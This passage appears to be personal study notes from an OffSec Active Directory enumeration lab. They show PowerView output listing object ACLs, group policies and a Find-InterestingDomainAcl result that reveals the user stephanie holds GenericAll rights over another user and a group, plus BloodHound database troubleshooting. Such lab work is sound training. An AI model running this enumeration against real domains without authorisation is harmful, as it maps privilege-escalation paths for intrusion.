ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : True
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1987370270-658905905-1781884369-519
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit, Inherited
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : ListChildren
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : ContainerInherit
BinaryLength          : 24
IsInherited           : True
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-32-554
AccessMask            : 4
AuditFlags            : None
AceFlags              : ContainerInherit, Inherited
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : ContainerInherit
BinaryLength          : 24
IsInherited           : True
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-32-544
AccessMask            : 983485
AuditFlags            : None
AceFlags              : ContainerInherit, Inherited
AceQualifier          : AccessAllowed

PS C:\Users\stephanie> Get-DomainGPO


usncreated               : 5672
systemflags              : -1946157056
displayname              : Default Domain Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EA
                           C-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00
                           C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
whenchanged              : 9/6/2022 8:52:34 PM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 24835
dscorepropagationdata    : {9/2/2022 11:10:49 PM, 1/1/1601 12:00:00 AM}
name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
flags                    : 0
cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\corp.com\sysvol\corp.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=com
whencreated              : 9/2/2022 11:08:26 PM
versionnumber            : 11
instancetype             : 4
objectguid               : d6b50459-7ebf-434b-ac1f-56467f07f8cc
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=com

usncreated               : 5675
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy
gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 9/2/2022 11:08:26 PM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 5675
dscorepropagationdata    : {9/2/2022 11:10:49 PM, 1/1/1601 12:00:00 AM}
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
flags                    : 0
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\corp.com\sysvol\corp.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=corp,DC=com
whencreated              : 9/2/2022 11:08:26 PM
versionnumber            : 1
instancetype             : 4
objectguid               : da3266fb-ab4e-4961-8ed1-fe2b81a9548a
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=com

PS C:\Users\stephanie> Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft

IdentityReferenceName ActiveDirectoryRights             AceType ObjectDN
--------------------- ---------------------             ------- --------
DC1$                             GenericAll AccessAllowedObject CN=DFSR-LocalSettings,CN=DC1,OU=Domain Controllers,DC=cor...
DC1$                             GenericAll AccessAllowedObject CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC1,OU=D...
DC1$                             GenericAll AccessAllowedObject CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-Lo...
stephanie                        GenericAll       AccessAllowed CN=Management Department,DC=corp,DC=com
stephanie                        GenericAll       AccessAllowed CN=robert,CN=Users,DC=corp,DC=com

```

#### Paso 2: ...
## Troubleshooting
* Problemas con base de datos en bloodhound:
```bash
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# pg_lsclusters

Ver Cluster Port Status Owner    Data directory              Log file
17  main    5432 down   postgres /var/lib/postgresql/17/main /var/log/postgresql/postgresql-17-main.log
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# pg_ctlcluster 17 main start     
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# pg_lsclusters              
Ver Cluster Port Status Owner    Data directory              Log file
17  main    5432 online postgres /var/lib/postgresql/17/main /var/log/postgresql/postgresql-17-main.log
                                                                                                                                                                                                              
```
## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

